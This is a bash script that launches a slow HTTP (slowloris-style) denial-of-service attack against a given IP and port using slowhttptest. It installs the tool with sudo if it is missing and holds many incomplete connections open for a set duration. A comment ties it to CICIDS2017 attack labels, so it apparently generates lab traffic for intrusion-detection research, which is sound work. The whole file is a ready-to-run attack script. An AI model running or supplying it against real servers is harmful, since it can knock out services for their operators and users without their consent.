#!/bin/bash
# Slow HTTP attack — opens many incomplete HTTP connections.
# Maps to CICIDS2017 "DoS slowloris" / "DoS Slowhttptest" labels.

set -e

TARGET="${1:-}"
PORT="${2:-8000}"
DURATION="${3:-30}"

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target-ip> [port] [duration-seconds]"
    exit 1
fi

if ! command -v slowhttptest >/dev/null 2>&1; then
    echo "[*] slowhttptest not found, installing..."
    sudo apt update -qq && sudo apt install -y slowhttptest
fi

echo "[*] Slow HTTP attack: $TARGET:$PORT for ${DURATION}s"

# -c 50 = 50 connections, -i 10 = 10 second intervals, -r 10 = 10 connections/sec
slowhttptest -c 50 -H -g -i 10 -r 10 -t GET \
    -u "http://$TARGET:$PORT/" \
    -l "$DURATION" -p 3 || true

echo "[+] Slow HTTP complete"
